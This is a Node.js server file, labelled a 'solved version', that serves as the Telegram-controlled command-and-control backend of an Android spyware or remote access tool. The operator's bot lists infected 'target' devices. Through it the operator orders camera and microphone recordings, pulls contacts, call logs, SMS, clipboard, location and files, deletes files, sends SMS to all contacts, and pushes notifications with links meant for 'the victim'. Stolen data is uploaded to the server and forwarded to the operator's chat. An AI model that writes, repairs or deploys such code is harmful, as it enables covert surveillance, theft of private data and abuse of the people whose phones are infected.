// server.js - Solved Version
// All stylized/fancy text characters have been replaced with plain text to ensure
// compatibility with hosting environments like Render and prevent syntax errors.

const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");

// IMPORTANT: For security, use environment variables on your hosting platform
// instead of hardcoding your token and chat ID here.
const token = process.env.TELEGRAM_TOKEN || 'your token here';
const id = process.env.CHAT_ID || 'chat id here';

const address = 'https://www.google.com'; // Used for keep-alive pings

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

app.get('/', function (req, res) {
    res.send('<h1 align="center">Server uploaded successfully</h1>');
});

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    appBot.sendDocument(id, req.file.buffer, {
        caption: `Message from <b>${req.headers.model}</b> device`,
        parse_mode: "HTML"
    }, {
        filename: name,
        contentType: 'application/txt',
    });
    res.send('');
});

app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `Message from <b>${req.headers.model}</b> device\n\n` + req.body['text'], { parse_mode: "HTML" });
    res.send('');
});

app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon']);
    appBot.sendMessage(id, `Location from <b>${req.headers.model}</b> device`, { parse_mode: "HTML" });
    res.send('');
});

appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const model = req.headers.model;
    const battery = req.headers.battery;
    const version = req.headers.version;
    const brightness = req.headers.brightness;
    const provider = req.headers.provider;

    ws.uuid = uuid;
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    });
    appBot.sendMessage(id,
        `New device connected\n\n` +
        `• Device Model : <b>${model}</b>\n` +
        `• Battery : <b>${battery}</b>\n` +
        `• Android Version : <b>${version}</b>\n` +
        `• Screen Brightness : <b>${brightness}</b>\n` +
        `• Provider : <b>${provider}</b>`,
        { parse_mode: "HTML" }
    );

    ws.on('close', function () {
        appBot.sendMessage(id,
            `Device disconnected\n\n` +
            `• Device Model : <b>${model}</b>\n` +
            `• Battery : <b>${battery}</b>\n` +
            `• Android Version : <b>${version}</b>\n` +
            `• Screen Brightness : <b>${brightness}</b>\n` +
            `• Provider : <b>${provider}</b>`,
            { parse_mode: "HTML" }
        );
        appClients.delete(ws.uuid);
    });
});

appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('Please reply with the number to which you want to send the SMS')) {
            currentNumber = message.text;
            appBot.sendMessage(id,
                'Great, now enter the message you want to send to this number\n\n' +
                '• Be careful that the message will not be sent if the number of characters in your message is more than allowed',
                { reply_markup: { force_reply: true } }
            );
        }
        if (message.reply_to_message.text.includes('Great, now enter the message you want to send to this number')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`);
                }
            });
            currentNumber = '';
            currentUuid = '';
            appBot.sendMessage(id,
                'Your request is in process\n\n' +
                '• You will receive a response in the next few moments', {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute command"]],
                        'resize_keyboard': true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('Enter the message you want to send to all contacts')) {
            const message_to_all = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                'Your request is in process\n\n' +
                '• You will receive a response in the next few moments', {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute command"]],
                        'resize_keyboard': true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('Enter the path of the file you want to download')) {
            const path = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                'Your request is in process\n\n' +
                '• You will receive a response in the next few moments', {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute command"]],
                        'resize_keyboard': true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('Enter the path of the file you want to delete')) {
            const path = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                'Your request is in process\n\n' +
                '• You will receive a response in the next few moments', {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute command"]],
                        'resize_keyboard': true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('Enter how long you want the microphone to be recorded')) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                'Your request is in process\n\n' +
                '• You will receive a response in the next few moments', {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute command"]],
                        'resize_keyboard': true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('Enter how long you want the main camera to be recorded')) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                'Your request is in process\n\n' +
                '• You will receive a response in the next few moments', {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute command"]],
                        'resize_keyboard': true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('Enter how long you want the selfie camera to be recorded')) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                'Your request is in process\n\n' +
                '• You will receive a response in the next few moments', {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute command"]],
                        'resize_keyboard': true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('Enter the message that you want to appear on the target device')) {
            const toastMessage = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                'Your request is in process\n\n' +
                '• You will receive a response in the next few moments', {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute command"]],
                        'resize_keyboard': true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('Enter the message you want to appear as notification')) {
            const notificationMessage = message.text;
            currentTitle = notificationMessage;
            appBot.sendMessage(id,
                'Great, now enter the link you want to be opened by the notification\n\n' +
                '• When the victim clicks on the notification, the link you are entering will be opened', { reply_markup: { force_reply: true } }
            );
        }
        if (message.reply_to_message.text.includes('Great, now enter the link you want to be opened by the notification')) {
            const link = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                'Your request is in process\n\n' +
                '• You will receive a response in the next few moments', {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute command"]],
                        'resize_keyboard': true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('Enter the audio link you want to play')) {
            const audioLink = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                'Your request is in process\n\n' +
                '• You will receive a response in the next few moments', {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute command"]],
                        'resize_keyboard': true
                    }
                }
            );
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                'Welcome to the control panel\n\n' +
                '• If the application is installed on the target device, wait for the connection.\n\n' +
                '• When you receive the connection message, it means the target device is connected and ready to receive commands.\n\n' +
                '• Click on the command button and select the desired device, then select the desired command.\n\n' +
                '• If you get stuck, send the /start command.', {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["Connected devices"], ["Execute command"]],
                        'resize_keyboard': true
                    }
                }
            );
        }
        if (message.text == 'Connected devices') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    'No connected devices available\n\n' +
                    '• Make sure the application is installed on the target device.'
                );
            } else {
                let text = 'List of connected devices:\n\n';
                appClients.forEach(function (value, key, map) {
                    text += `• Device Model : <b>${value.model}</b>\n` +
                        `• Battery : <b>${value.battery}</b>\n` +
                        `• Android Version : <b>${value.version}</b>\n` +
                        `• Screen Brightness : <b>${value.brightness}</b>\n` +
                        `• Provider : <b>${value.provider}</b>\n\n`;
                });
                appBot.sendMessage(id, text, { parse_mode: "HTML" });
            }
        }
        if (message.text == 'Execute command') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    'No connected devices available\n\n' +
                    '• Make sure the application is installed on the target device.'
                );
            } else {
                const deviceListKeyboard = [];
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }]);
                });
                appBot.sendMessage(id, 'Select device to execute command:', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                });
            }
        }
    } else {
        appBot.sendMessage(id, 'Permission denied');
    }
});

appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const commend = data.split(':')[0];
    const uuid = data.split(':')[1];

    if (commend == 'device') {
        appBot.editMessageText(`Select command for device: <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Apps', callback_data: `apps:${uuid}` }, { text: 'Device info', callback_data: `device_info:${uuid}` }],
                    [{ text: 'Get file', callback_data: `file:${uuid}` }, { text: 'Delete file', callback_data: `delete_file:${uuid}` }],
                    [{ text: 'Clipboard', callback_data: `clipboard:${uuid}` }, { text: 'Microphone', callback_data: `microphone:${uuid}` }],
                    [{ text: 'Main camera', callback_data: `camera_main:${uuid}` }, { text: 'Selfie camera', callback_data: `camera_selfie:${uuid}` }],
                    [{ text: 'Location', callback_data: `location:${uuid}` }, { text: 'Toast', callback_data: `toast:${uuid}` }],
                    [{ text: 'Calls', callback_data: `calls:${uuid}` }, { text: 'Contacts', callback_data: `contacts:${uuid}` }],
                    [{ text: 'Vibrate', callback_data: `vibrate:${uuid}` }, { text: 'Show notification', callback_data: `show_notification:${uuid}` }],
                    [{ text: 'Messages', callback_data: `messages:${uuid}` }, { text: 'Send message', callback_data: `send_message:${uuid}` }],
                    [{ text: 'Play audio', callback_data: `play_audio:${uuid}` }, { text: 'Stop audio', callback_data: `stop_audio:${uuid}` }],
                    [{ text: 'Send message to all contacts', callback_data: `send_message_to_all:${uuid}` }]
                ]
            },
            parse_mode: "HTML"
        });
    }

    const commands_with_immediate_response = [
        'calls', 'contacts', 'messages', 'apps', 'device_info',
        'clipboard', 'camera_main', 'camera_selfie', 'location',
        'vibrate', 'stop_audio'
    ];

    if (commands_with_immediate_response.includes(commend)) {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send(commend);
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            'Your request is in process\n\n' +
            '• You will receive a response in the next few moments', {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["Connected devices"], ["Execute command"]],
                    'resize_keyboard': true
                }
            }
        );
    }

    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, 'Please reply with the number to which you want to send the SMS\n\n' +
            '• If you want to send SMS to local country numbers, you can enter the number with zero at the beginning, otherwise enter the number with the country code', { reply_markup: { force_reply: true } });
        currentUuid = uuid;
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            'Enter the message you want to send to all contacts\n\n' +
            '• Be careful that the message will not be sent if the number of characters in your message is more than allowed', { reply_markup: { force_reply: true } }
        );
        currentUuid = uuid;
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            'Enter the path of the file you want to download\n\n' +
            '• You do not need to enter the full file path, just enter the main path. For example, enter<b> DCIM/Camera </b> to receive gallery files.', { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        );
        currentUuid = uuid;
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            'Enter the path of the file you want to delete\n\n' +
            '• You do not need to enter the full file path, just enter the main path. For example, enter<b> DCIM/Camera </b> to delete gallery files.', { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        );
        currentUuid = uuid;
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            'Enter how long you want the microphone to be recorded\n\n' +
            '• Note that you must enter the time numerically in units of seconds', { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        );
        currentUuid = uuid;
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            'Enter the message that you want to appear on the target device\n\n' +
            '• Toast is a short message that appears on the device screen for a few seconds', { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        );
        currentUuid = uuid;
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            'Enter the message you want to appear as notification\n\n' +
            '• Your message will appear in the target device status bar like a regular notification', { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        );
        currentUuid = uuid;
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            'Enter the audio link you want to play\n\n' +
            '• Note that you must enter the direct link of the desired sound, otherwise the sound will not be played', { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        );
        currentUuid = uuid;
    }
});

setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping'); // Keep WebSocket connection alive
    });
    try {
        // Keep Render service alive by making an HTTP request
        axios.get(address).then(r => "").catch(e => {});
    } catch (e) {}
}, 5000); // 5 seconds is too frequent. Consider 60000 (1 minute) or more.


// Use the PORT environment variable provided by Render
const PORT = process.env.PORT || 8999;
appServer.listen(PORT, () => {
    console.log(`Server is listening on port ${PORT}`);
});
